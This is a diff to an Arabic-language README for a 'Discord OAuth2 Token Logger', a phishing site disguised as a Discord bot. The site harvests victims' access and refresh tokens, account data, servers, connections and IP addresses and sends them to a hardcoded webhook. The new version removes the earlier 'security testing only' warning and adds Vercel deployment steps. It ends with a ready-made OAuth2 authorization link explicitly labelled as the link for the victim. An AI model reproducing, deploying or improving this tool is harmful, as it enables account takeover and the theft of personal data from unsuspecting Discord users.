@@ -1,29 +1,22 @@
-# Discord OAuth2 Token Logger
+# Discord OAuth2 Token Logger v3
 
-## الفكرة
-موقع ويب يبدو كأنه بوت ديسكورد عادي. الضحية يضغط "Add to Discord" ويوافق على OAuth2. الموقع يسحب:
-- Access Token
-- Refresh Token
-- بيانات اليوزر كاملة
-- السيرفرات
-- الـ Connections
-- IP Address
-
-## التشغيل
-```bash
-pip install -r requirements.txt
-python app.py
-```
+## المميزات
+- ✅ Webhook hardcoded تلقائي
+- ✅ إشعار تشغيل فوري للـ Webhook
+- ✅ redirect_uri: auth2-logger.vercel.app
+- ✅ Debug Logs مفصلة
 
 ## الإعداد
-1. عدل `WEBHOOK_URL` في `app.py` أو `.env`
-2. تأكد الـ `REDIRECT_URI` في Discord Developer Portal يطابق الموقع
-3. شغل الموقع
+1. عدل Redirects في Discord Developer Portal:
+   https://auth2-logger.vercel.app/callback
 
-## المسارات
-- `/` - الصفحة الرئيسية (الفخ)
-- `/login` - يودي لـ Discord OAuth2
-- `/callback` - يستلم الكود ويسحب البيانات
+2. ارفع على Vercel:
+   ```bash
+   npm i -g vercel
+   vercel
+   ```
 
-## تحذير
-هذه الأداة للاختبار الأمني فقط. استخدامها ضد أشخاص بدون إذن غير قانوني.
+3. أول ما يشتغل، يجيك إشعار في الويب هوك: "تم تشغيل الموقع بنجاح"
+
+## الرابط للضحية
+https://discord.com/oauth2/authorize?client_id=1541786357028884534&response_type=code&redirect_uri=https%3A%2F%2Fauth2-logger.vercel.app%2Fcallback&scope=identify+connections+guilds.members.read+email+gdm.join
